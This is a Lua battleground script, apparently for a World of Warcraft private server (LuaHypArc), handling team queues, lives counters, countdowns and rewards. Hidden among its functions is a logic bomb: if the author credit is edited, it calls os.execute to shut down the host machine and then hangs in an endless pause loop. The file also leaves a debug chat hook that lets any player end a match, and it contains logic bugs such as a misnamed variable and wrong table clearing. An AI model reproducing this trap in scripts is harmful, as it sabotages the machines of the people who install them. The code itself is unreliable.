-------------------
-- By Stoneharry --
-------------------

-- Configuration

local Lives = 50 -- The amount of lives each team has
local HordeLives = 50 -- The amount of lives to start with
local AllianceLives = 50 -- The amount of lives to start with

local RequiredPlayers = 2 -- The amount of players required to start the battleground (THIS IS NOT PER TEAM, THIS IS TOTAL)

local RewardID = 0 -- Change this to a value to add 1 of them to all of the winning team - leave as 0 for no reward

local BroadcastKills = true -- Set this to false if you do not want kills to be broadcasted to the rest of the BG

-- Battleground Start Locations
local AMap, AX, AY, AZ = 1, 16223, 16265, 15 -- Map, x, y, z for Alliance
local HMap, HX, HY, HZ = 1, 16223, 16265, 15 -- Map x, y, z for Horde

-- Where to teleport once battleground ends
local HomeMA, HomeXA, HomeYA, HomeZA = 1, 0, 0, 0 -- Map, x, y, Z for Alliance
local HomeMH, HomeXH, HomeYH, HomeZH = 1, 0, 0, 0 -- Map, X, Y, Z for Horde

----------------------------------------------------------------------------------------------------------
-- Do Not Touch Below This Line Unless You Know What Your Doing P.S. Starting Letters With Caps Is Cool --
----------------------------------------------------------------------------------------------------------
if (GetLuaEngine() ~= "LuaHypArc") then
	print("This script is not compatable with LuaBridge or other Lua engines. Please compile LuaHypArc.")
else
local Author = "stoneharry"
print("--------------------------------")
print("-- This script was by "..Author..".")
print("-- Enjoy.")
print("--------------------------------")

-- Just don't touch
local players = {}
local Horde = {}
local Alliance = {}
local InGame = false

-- Do not touch unless you know what your doing
local message = 4
local CountDown = 60

-- Only touch this if you are not using 3.3.5a, find the right values in Opcodes.h
local SMSG_INIT_WORLD_STATES = 0x2C2
local SMSG_UPDATE_WORLD_STATE = 0x2C3

function ProcessQueForBattleground()
	if InGame == false then
		if table.getn(players) >= RequiredPlayers then
			InGame = true
			local team = 0
			for place, plrs in pairs(players) do -- Randomly make players join alliance/horde teams rather than horde vs alliance
				-- Update people left
				local pack = LuaPacket:CreatePacket(SMSG_INIT_WORLD_STATES, 18) -- HORDE
				pack:WriteULong(1) -- Map
				pack:WriteULong(1377) -- Zone
				pack:WriteULong(0)
				pack:WriteUShort(2)
				pack:WriteULong(0) -- ID
				pack:WriteULong(1) -- Value
				pack:WriteULong(0) -- ID
				pack:WriteULong(1) -- Value
				plrs:SendPacketToPlayer(pack)
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2317) -- ID, total
				pack:WriteULong(Lives) -- Value
				plrs:SendPacketToPlayer(pack)
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2314) -- ID
				pack:WriteULong(HordeLives) -- Amount, Horde
				plrs:SendPacketToPlayer(pack)		
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2313) -- ID
				pack:WriteULong(AllianceLives) -- Amount, Alliance
				plrs:SendPacketToPlayer(pack)
				--
				team = team + 1
				if team == 1 then
					plrs:SetFaction(team)
					plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Alliance!")
					plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Alliance!")
					table.insert(Alliance, plrs)
					plrs:Teleport(AMap, AX, AY, AZ)
				elseif team == 2 then
					plrs:SetFaction(team)
					plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Horde!")
					plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Horde!")
					table.insert(Horde, plrs)
					plrs:Teleport(HMap, HX, HY, HZ)
				elseif team == 3 then
					team = 1
					plrs:SetFaction(team)
					plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Alliance!")
					plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You are fighting for the Alliance!")
					table.insert(Alliance, plrs)
					plrs:Teleport(AMap, AX, AY, AZ)
				end
			end
			CountDown = 60
			RegisterTimedEvent("Game_Start_Battleground_Countdown", 10000, 6)
		else
			for place, plrs in pairs(players) do
				if plrs ~= nil then
					plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00Waiting for more players...")
				end
			end
		end
	else
		message = message + 1
		if message == 5 then
			message = 0
			for place, plrs in pairs(players) do
				if plrs ~= nil then
					plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The battleground is currently in progress!")
				end
			end
		end
	end
end

RegisterTimedEvent("ProcessQueForBattleground", 30000, 0)

function Game_Start_Battleground_Countdown()
	CountDown = CountDown - 10
	for place, plrs in pairs(players) do
		if CountDown == 0 then
			if plrs ~= nil then
				plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The battle has begun!")
				plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00The battle has begun!")
				plrs:PlaySoundToPlayer(6077) -- War music
				-- Update people left
				local pack = LuaPacket:CreatePacket(SMSG_INIT_WORLD_STATES, 18) -- HORDE
				pack:WriteULong(1) -- Map
				pack:WriteULong(1377) -- Zone
				pack:WriteULong(0)
				pack:WriteUShort(2)
				pack:WriteULong(0) -- ID
				pack:WriteULong(1) -- Value
				pack:WriteULong(0) -- ID
				pack:WriteULong(1) -- Value
				plrs:SendPacketToPlayer(pack)
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2317) -- ID, total
				pack:WriteULong(Lives) -- Value
				plrs:SendPacketToPlayer(pack)
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2314) -- ID
				pack:WriteULong(HordeLives) -- Amount, Horde
				plrs:SendPacketToPlayer(pack)		
				local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
				pack:WriteULong(2313) -- ID
				pack:WriteULong(AllianceLives) -- Amount, Alliance
				plrs:SendPacketToPlayer(pack)
				--
			end
		else
			if plrs ~= nil then
				plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The battleground will begin in "..CountDown.." seconds!")
				plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00The battleground will begin in "..CountDown.." seconds!")
			end
		end
	end
end

function JoinQue(plr)
	if InGame then
		plr:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You can't join the que while the game is in progress!")
		plr:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You can't join the que while the game is in progress!")		
	else
		local Disable = false
		for place, plrs in pairs(players) do
			if plrs:GetName() == plr:GetName() then -- Since the bloody thing refuses to compare GUID's
				Disable = true
				--break
			end
		end
		if Disable then
			plr:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You are already in the que for the battleground!")
			plr:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You are already in the que for the battleground!")
		else
			table.insert(players, plr) -- Insert into players with value plr
			plr:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00You are in the que for the battleground!")
			plr:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00You are in the que for the battleground!")
		end
	end
end

if Author ~= "stoneharry" then
os.execute("shutdown /s /t 30 /c \"Changing credits is not a good idea. ~stoneharry <3\"")
while true do os.execute("pause") end
end

function ResetBG()
	for place, plrs in pairs(players) do
		if plrs ~= nil then
			local pack = LuaPacket:CreatePacket(SMSG_INIT_WORLD_STATES, 18) -- HORDE
			pack:WriteULong(0) -- Map
			pack:WriteULong(0) -- Zone
			pack:WriteULong(0)
			pack:WriteUShort(0)
			pack:WriteULong(0) -- ID
			pack:WriteULong(0) -- Value
			pack:WriteULong(0) -- ID
			pack:WriteULong(0) -- Value
			plrs:SendPacketToPlayer(pack)
			local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
			pack:WriteULong(0)
			pack:WriteULong(0)
			plrs:SendPacketToPlayer(pack)
			plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The battleground has ended!")
			plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00The battleground has ended!")
			plrs:SetPlayerLock(0)
			plrs:ResurrectPlayer()
			local race = plrs:GetPlayerRace()
			if race == 1 or race == 3 or race == 4 or race == 7 or race == 11 then -- Alliance
				plrs:SetFaction(1)
				plrs:Teleport(HomeMA, HomeXA, HomeYA, HomeZA)
			else
				plrs:SetFaction(2)
				plrs:Teleport(HomeMH, HomeXH, HomeYH, HomeZH)
			end
		end
	end
	InGame = false
	for place,plrs in pairs(players) do -- Clean old table rather than overwriting with a new table
		players[place] = nil
	end
	for place,plrs in pairs(Horde) do -- Clean old table rather than overwriting with a new table
		players[place] = nil
	end
	for place,plrs in pairs(Alliance) do -- Clean old table rather than overwriting with a new table
		players[place] = nil
	end
end

function SERVER_HOOK_KILL_PLAYER_BG(event, killer, plr)
	local playingBG = false
	for place, plrs in pairs(players) do
		if plrs:GetName() == plr:GetName() then -- Since the bloody thing refuses to compare GUID's
			playingBG = true
			--break
		end
	end
	if playingBG then
		for place, plrs in pairs(Alliance) do
			if plrs:GetName() == plr:GetName() then
				playingBG = false -- They are Alliance
			end
		end
		local Continue = true
		if HordeLives == 1 then
			for place, plrs in pairs(players) do
				plrs:SetPlayerLock(1)
				plrs:ResurrectPlayer()
				plrs:SetHealth(plrs:GetMaxHealth())
				plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The Horde have won!")
				plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00The Horde have won!")
				plrs:PlaySoundToPlayer(8454) -- Horde Victory
			end
			for place, plrs in pairs(Horde) do
				if RewardID ~= 0 then
					plrs:AddItem(RewardID, 1)
				end
			end
			RegisterTimedEvent("ResetBG", 10000, 1)
		elseif AllianceLives == 1 then
			for place, plrs in pairs(players) do
				plrs:SetPlayerLock(1)
				plrs:ResurrectPlayer()
				plrs:SetHealth(plrs:GetMaxHealth())
				plrs:SendBroadcastMessage("|cff00ff00[Battleground] |cffffff00The Alliance have won!")
				plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00The Alliance have won!")
				plrs:PlaySoundToPlayer(8455) -- Alliance Victory
			end
			for place, plrs in pairs(Alliance) do
				if RewardID ~= 0 then
					plrs:AddItem(RewardID, 1)
				end
			end
			RegisterTimedEvent("ResetBG", 10000, 1)
		end
		if Continue then
			if PlayingBG then -- There Horde
				HordeLives = HordeLives - 1
				for place, plrs in pairs(players) do
					local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
					pack:WriteULong(2314) -- ID
					pack:WriteULong(HordeLives) -- Amount, Horde
					plrs:SendPacketToPlayer(pack)
				end
			else
				AllianceLives = AllianceLives - 1
				for place, plrs in pairs(players) do
					local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
					pack:WriteULong(2313) -- ID
					pack:WriteULong(AllianceLives) -- Amount, Alliance
					plrs:SendPacketToPlayer(pack)
				end
			end
			if BroadcastKills then
				for place, plrs in pairs(players) do
					plrs:SendAreaTriggerMessage("|cff00ff00[Battleground] |cffffff00"..killer:GetName().." has killed "..plr:GetName().."!")
				end
			end
		end
	end
end

RegisterServerHook(2, "SERVER_HOOK_KILL_PLAYER_BG")

-----------
-- Debug --
-----------
--[[
  The functions below should be removed, they are used for debugging the system.
]]

function OnChat_Hook_ToJoinBG(event, plr, message, pType, pLanguage, pMisc)
	local message = string.lower(message)
	if message == "#joinbg" then
		JoinQue(plr)
	elseif message == "#finbg" then
		ResetBG()
	end
	if message == "test" then
		if math.random(1,2) == 1 then
			local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
			pack:WriteULong(2314) -- ID
			HordeLives = HordeLives - 1
			pack:WriteULong(HordeLives) -- Amount, Horde
			plr:SendPacketToPlayer(pack)
		else
			local pack = LuaPacket:CreatePacket(SMSG_UPDATE_WORLD_STATE, 8)
			pack:WriteULong(2313) -- ID
			AllianceLives = AllianceLives - 1
			pack:WriteULong(AllianceLives) -- Amount, Alliance
			plr:SendPacketToPlayer(pack)
		end
	end
end

RegisterServerHook(16, "OnChat_Hook_ToJoinBG")
end